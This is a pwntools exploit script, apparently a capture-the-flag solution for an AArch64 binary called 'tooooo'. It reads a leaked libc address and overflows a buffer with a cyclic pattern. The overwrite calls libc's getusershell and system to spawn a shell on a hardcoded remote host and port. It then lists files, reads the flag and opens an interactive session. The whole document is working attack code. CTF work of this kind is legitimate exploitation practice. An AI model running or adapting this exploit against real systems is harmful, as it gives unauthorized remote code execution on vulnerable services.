#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./tooooo"
context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./tooooo"])
    libc = ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./tooooo"])
    libc = ELF("/usr/aarch64-linux-gnu/lib/libc.so.6", checksec = False)
else:
    io = remote("13.230.48.252", 4869)
    libc = ELF("./libc-2.27.so", checksec = False)

if __name__ == "__main__":
    libc.sym['one_gadget'] = 0x41CC0
    libc.address = int(io.recvline(), 16) - libc.sym['_IO_2_1_stdout_']
    success("libc -> {:#x}".format(libc.address))
    binsh = next(libc.search("/bin/sh\0"))
    #  success("binsh -> {:#x}".format(binsh))
    #  success("one_gadget -> {:#x}".format(libc.sym['one_gadget']))
    #  payload = flat(cyclic(0x20), libc.sym['one_gadget'], libc.sym['one_gadget'])
    payload = flat(cyclic(0x20), libc.sym['getusershell'], libc.sym['system'])
    io.sendline(payload)

    try:
        io.sendline("echo ABCDEFG")
        io.recvuntil("ABCDEFG")
        io.sendline("ls")
        io.sendline("cat flag")
        io.interactive()
    except:
        io.close()
